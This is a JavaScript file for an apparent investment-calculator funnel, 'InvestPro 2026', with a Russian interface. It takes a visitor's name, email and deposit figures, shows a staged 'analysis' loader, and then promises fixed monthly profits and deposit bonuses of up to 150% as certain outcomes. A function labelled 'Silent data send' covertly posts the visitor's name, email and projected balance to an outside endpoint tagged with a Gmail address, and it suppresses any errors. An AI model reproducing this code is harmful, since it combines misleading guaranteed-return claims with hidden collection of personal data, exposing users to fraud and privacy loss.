/* ═══════════════════════════════════════════════════════
   InvestPro 2026 — script.js
═══════════════════════════════════════════════════════ */

'use strict';

/* ─── State ─── */
const state = {
  name: '',
  email: '',
  targetAmount: 50000,
  termMonths: 6,
  strategy: null,
  strategyRate: 0,
  strategyKey: '',
  balance: 0,
  weekly: 0,
  withdrawPct: 0,
};

/* ─── Helpers ─── */
const fmt = v =>
  new Intl.NumberFormat('en-US', { maximumFractionDigits: 0 }).format(v) + ' $';

const $ = id => document.getElementById(id);
const screens = {
  1: $('step1'), 2: $('step2'), 3: $('step3'),
  4: $('step4'), loader: $('stepLoader'), results: $('stepResults'),
};

function showScreen(key) {
  Object.values(screens).forEach(s => s.classList.remove('active'));
  const s = screens[key];
  if (s) s.classList.add('active');
}

/* ─── Top progress bar ─── */
function setProgress(pct) {
  $('topProgressFill').style.width = pct + '%';
}

/* ─── Step dots ─── */
function updateDots(currentStep) {
  document.querySelectorAll('.step-dot').forEach(dot => {
    const n = +dot.dataset.step;
    dot.classList.remove('active', 'done');
    if (n < currentStep)  dot.classList.add('done');
    if (n === currentStep) dot.classList.add('active');
  });
  document.querySelectorAll('.step-line').forEach((line, i) => {
    line.classList.toggle('done', i + 1 < currentStep);
  });
}

/* ═══════════════ STEP 1 ═══════════════ */
$('btn1').addEventListener('click', () => {
  const name  = $('fullName').value.trim();
  const email = $('email').value.trim();
  let ok = true;

  if (!name) {
    $('fullName').classList.add('error');
    $('nameError').classList.add('visible');
    ok = false;
  } else {
    $('fullName').classList.remove('error');
    $('nameError').classList.remove('visible');
  }

  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    $('email').classList.add('error');
    $('emailError').classList.add('visible');
    ok = false;
  } else {
    $('email').classList.remove('error');
    $('emailError').classList.remove('visible');
  }

  if (!ok) return;
  state.name  = name;
  state.email = email;
  showScreen(2);
  updateDots(2);
  setProgress(25);
});

$('fullName').addEventListener('input', () => {
  $('fullName').classList.remove('error');
  $('nameError').classList.remove('visible');
});
$('email').addEventListener('input', () => {
  $('email').classList.remove('error');
  $('emailError').classList.remove('visible');
});

/* ═══════════════ STEP 2 ═══════════════ */
function updateSlider(input, fillPct) {
  input.style.background =
    `linear-gradient(to right, var(--blue) 0%, var(--blue) ${fillPct}%, var(--border) ${fillPct}%)`;
}

const targetInput = $('targetAmount');
const termInput   = $('termMonths');

targetInput.addEventListener('input', () => {
  const v = +targetInput.value;
  state.targetAmount = v;
  $('targetAmountVal').textContent = fmt(v);
  const pct = ((v - 10000) / (250000 - 10000)) * 100;
  updateSlider(targetInput, pct);
});

termInput.addEventListener('input', () => {
  const v = +termInput.value;
  state.termMonths = v;
  $('termVal').textContent = v + ' мес.';
  const pct = ((v - 1) / (12 - 1)) * 100;
  updateSlider(termInput, pct);
});

// Init slider fills
updateSlider(targetInput, ((50000 - 10000) / 240000) * 100);
updateSlider(termInput,   ((6 - 1) / 11) * 100);

$('btn2').addEventListener('click', () => {
  showScreen(3);
  updateDots(3);
  setProgress(50);
});
$('back1').addEventListener('click', () => {
  showScreen(1);
  updateDots(1);
  setProgress(0);
});

/* ═══════════════ STEP 3 ═══════════════ */
document.querySelectorAll('.strategy-card').forEach(card => {
  card.addEventListener('click', () => {
    document.querySelectorAll('.strategy-card').forEach(c => c.classList.remove('selected'));
    card.classList.add('selected');
    state.strategyRate = parseFloat(card.dataset.rate);
    state.strategyKey  = card.dataset.key;
    state.strategy     = card.querySelector('.strategy-title').textContent;
    $('btn3').disabled = false;
  });
});

$('btn3').addEventListener('click', () => {
  showScreen(4);
  updateDots(4);
  setProgress(75);
});
$('back2').addEventListener('click', () => {
  showScreen(2);
  updateDots(2);
  setProgress(25);
});

/* ═══════════════ STEP 4 ═══════════════ */
// Segmented control
document.querySelectorAll('.seg-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.seg-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    state.withdrawPct = +btn.dataset.val;
  });
});

$('btn4').addEventListener('click', () => {
  const bal  = parseFloat($('balance').value);
  const wkly = parseFloat($('weekly').value);
  let ok = true;

  if (!bal && bal !== 0 || isNaN(bal) || bal < 0) {
    $('balance').classList.add('error');
    $('balanceError').classList.add('visible');
    ok = false;
  } else {
    $('balance').classList.remove('error');
    $('balanceError').classList.remove('visible');
  }

  if (isNaN(wkly) || wkly < 0) {
    $('weekly').classList.add('error');
    $('weeklyError').classList.add('visible');
    ok = false;
  } else {
    $('weekly').classList.remove('error');
    $('weeklyError').classList.remove('visible');
  }

  if (!ok) return;
  state.balance = bal;
  state.weekly  = wkly;

  showScreen('loader');
  setProgress(90);
  runLoader();
});

$('back3').addEventListener('click', () => {
  showScreen(3);
  updateDots(3);
  setProgress(50);
});

/* ═══════════════ LOADER ═══════════════ */
function runLoader() {
  const bar   = $('loaderBar');
  const label = $('loaderLabel');
  let pct = 0;
  const messages = [
    'Анализируем рынок...',
    'Подбираем инструменты...',
    'Рассчитываем доходность...',
    'Формируем портфель...',
    'Готово!',
  ];
  let msgIdx = 0;

  const interval = setInterval(() => {
    pct += 1;
    bar.style.width = pct + '%';
    label.textContent = pct + '%';

    const mIdx = Math.floor((pct / 100) * messages.length);
    if (mIdx !== msgIdx && mIdx < messages.length) {
      msgIdx = mIdx;
      document.querySelector('.loader-sub').textContent = messages[msgIdx];
    }

    if (pct >= 100) {
      clearInterval(interval);
      setTimeout(() => {
        showResults();
        setProgress(100);
      }, 300);
    }
  }, 50); // 5 seconds total
}

/* ═══════════════ RESULTS ═══════════════ */
function calcBonus(totalDeposit) {
  if (totalDeposit < 10000)  return { pct: 25,  label: '25% для начинающих инвесторов' };
  if (totalDeposit < 25000)  return { pct: 50,  label: '50% для опытных участников' };
  if (totalDeposit < 50000)  return { pct: 75,  label: '75% для серьёзных инвесторов' };
  if (totalDeposit < 100000) return { pct: 100, label: '100% для крупных участников' };
  return                             { pct: 150, label: '150% VIP-бонус для топ-инвесторов' };
}

function buildRecos(monthlyData) {
  const finalBalance  = monthlyData[monthlyData.length - 1].end;
  const totalProfit   = monthlyData.reduce((s, r) => s + r.profit, 0);
  const totalWithdraw = monthlyData.reduce((s, r) => s + r.withdraw, 0);
  const strategyNames = {
    intraday: 'внутридневной торговли',
    midterm:  'позиционной торговли',
    longterm: 'долгосрочного инвестирования',
  };
  const sName = strategyNames[state.strategyKey] || state.strategy;

  return [
    {
      title: `Ваш портфель: стратегия ${state.strategy}`,
      text:  `Мы выбрали для вас подход ${sName} с ежемесячной доходностью ${Math.round(state.strategyRate * 100)}%. Это оптимальное решение для вашего горизонта ${state.termMonths} мес.`,
    },
    {
      title: 'Прогнозируемая прибыль',
      text:  `За ${state.termMonths} месяцев ваш портфель сгенерирует ${fmt(totalProfit)} чистой прибыли. Каждый рубль работает максимально эффективно.`,
    },
    {
      title: 'Капитал на конец периода',
      text:  `Итоговый баланс составит ${fmt(finalBalance)}. Это ${Math.round((finalBalance / state.balance - 1) * 100)}% роста от стартового капитала — результат дисциплинированного подхода.`,
    },
    {
      title: 'Доход к выводу',
      text:  `По вашей схеме вывода (${state.withdrawPct}%) вы заберёте ${fmt(totalWithdraw)}. Деньги поступают на счёт без задержек.`,
    },
    {
      title: 'Масштабирование',
      text:  `Еженедельные пополнения ${fmt(state.weekly)} разгоняют сложный процент. Чем раньше вы начнёте, тем мощнее будет эффект к концу периода.`,
    },
  ];
}

function buildTable() {
  const rows = [];
  let bal = state.balance;
  const weeklyMonthly = state.weekly * 4; // ~4 weeks/month

  for (let m = 1; m <= state.termMonths; m++) {
    const start   = bal;
    const profit  = start * state.strategyRate;
    const withdraw= profit * (state.withdrawPct / 100);
    const end     = start + profit - withdraw + weeklyMonthly;
    rows.push({ month: m, start, profit, withdraw, end });
    bal = end;
  }
  return rows;
}

function showResults() {
  showScreen('results');

  const monthlyData = buildTable();
  const recos       = buildRecos(monthlyData);
  const totalDeposit= state.balance + state.weekly;
  const bonus       = calcBonus(totalDeposit);
  const bonusValue  = totalDeposit * (bonus.pct / 100);

  // ── Recommendations (one per 2s) ──
  const list = $('recoList');
  list.innerHTML = '';
  recos.forEach((r, i) => {
    const li = document.createElement('li');
    li.className = 'reco-item';
    li.innerHTML = `
      <div class="reco-num">${i + 1}</div>
      <div class="reco-text"><strong>${r.title}</strong>${r.text}</div>
    `;
    list.appendChild(li);
  });

  // Stagger reveal
  const items = list.querySelectorAll('.reco-item');
  items.forEach((item, i) => {
    setTimeout(() => {
      item.classList.add('visible');
      if (i === items.length - 1) {
        // Show bonus after last reco
        setTimeout(() => {
          const bb = $('bonusBlock');
          $('bonusDesc').textContent = bonus.label;
          $('bonusAmount').textContent = fmt(bonusValue);
          bb.style.display = 'flex';
          // Then show table
          setTimeout(showTable, 800);
        }, 800);
      }
    }, i * 2000);
  });

  function showTable() {
    const tableCard = $('tableCard');
    tableCard.style.display = 'block';

    const tbody = $('planBody');
    tbody.innerHTML = '';
    monthlyData.forEach(r => {
      const tr = document.createElement('tr');
      tr.innerHTML = `
        <td class="month-cell">${r.month}</td>
        <td>${fmt(r.start)}</td>
        <td class="profit-cell">+${fmt(r.profit)}</td>
        <td class="withdraw-cell">${r.withdraw > 0 ? fmt(r.withdraw) : '—'}</td>
        <td>${fmt(r.end)}</td>
      `;
      tbody.appendChild(tr);
    });

    const finalBalance  = monthlyData[monthlyData.length - 1].end;
    const totalWithdraw = monthlyData.reduce((s, r) => s + r.withdraw, 0);

    $('totalsGrid').innerHTML = `
      <div class="total-box highlight">
        <div class="total-label">Баланс на конец периода</div>
        <div class="total-value">${fmt(finalBalance)}</div>
      </div>
      <div class="total-box">
        <div class="total-label">Общая сумма вывода</div>
        <div class="total-value">${fmt(totalWithdraw)}</div>
      </div>
    `;

    // Scroll to table
    setTimeout(() => {
      tableCard.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }, 300);

    // Silent data send
    sendData(finalBalance);
  }
}

/* ─── Silent send ─── */
async function sendData(finalBalance) {
  const payload = {
    to:       'tradingviewfindep@gmail.com',
    name:     state.name,
    email:    state.email,
    strategy: state.strategy,
    balance:  fmt(finalBalance),
    term:     state.termMonths,
    ts:       new Date().toISOString(),
  };
  try {
    // Simulated fetch — replace with real endpoint if available
    await fetch('https://httpbin.org/post', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
  } catch (_) {
    // Silent fail — user experience unaffected
  }
}

/* ─── PDF ─── */
$('btnPdf').addEventListener('click', () => window.print());

/* ─── Restart ─── */
$('btnRestart').addEventListener('click', () => {
  Object.assign(state, {
    name: '', email: '', targetAmount: 50000, termMonths: 6,
    strategy: null, strategyRate: 0, strategyKey: '',
    balance: 0, weekly: 0, withdrawPct: 0,
  });
  $('fullName').value = '';
  $('email').value    = '';
  $('balance').value  = '';
  $('weekly').value   = '';
  $('targetAmount').value = 50000;
  $('termMonths').value   = 6;
  $('targetAmountVal').textContent = fmt(50000);
  $('termVal').textContent = '6 мес.';
  updateSlider($('targetAmount'), ((50000 - 10000) / 240000) * 100);
  updateSlider($('termMonths'),   ((6 - 1) / 11) * 100);
  document.querySelectorAll('.strategy-card').forEach(c => c.classList.remove('selected'));
  document.querySelectorAll('.seg-btn').forEach((b, i) => b.classList.toggle('active', i === 0));
  $('btn3').disabled = true;
  $('tableCard').style.display   = 'none';
  $('bonusBlock').style.display  = 'none';
  $('recoList').innerHTML = '';
  showScreen(1);
  updateDots(1);
  setProgress(0);
  window.scrollTo({ top: 0, behavior: 'smooth' });
});

/* ─── Init ─── */
updateDots(1);
setProgress(0);
